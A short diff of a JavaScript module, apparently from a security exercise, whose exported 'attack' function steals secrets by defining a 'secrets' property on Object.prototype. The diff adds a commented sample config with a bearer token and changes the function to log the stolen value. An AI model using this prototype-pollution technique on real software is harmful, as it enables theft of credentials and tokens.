@@ -1,3 +1,13 @@
+  /* {
+    'www.google.com': {
+      headers: {
+        Authorization: 'Bearer ANY_SECRET'
+      },
+      method: 'GET'
+    }
+  } */
+
+
 let stolen;
 
 // Remove the functionality of accepting null prototype
@@ -15,6 +25,6 @@ Object.defineProperty(Object.prototype, "secrets", {
 
 export const attack = (authzManager, success) => {
   if (stolen) {
-    success(stolen);
+    console.log(stolen);
   }
 };
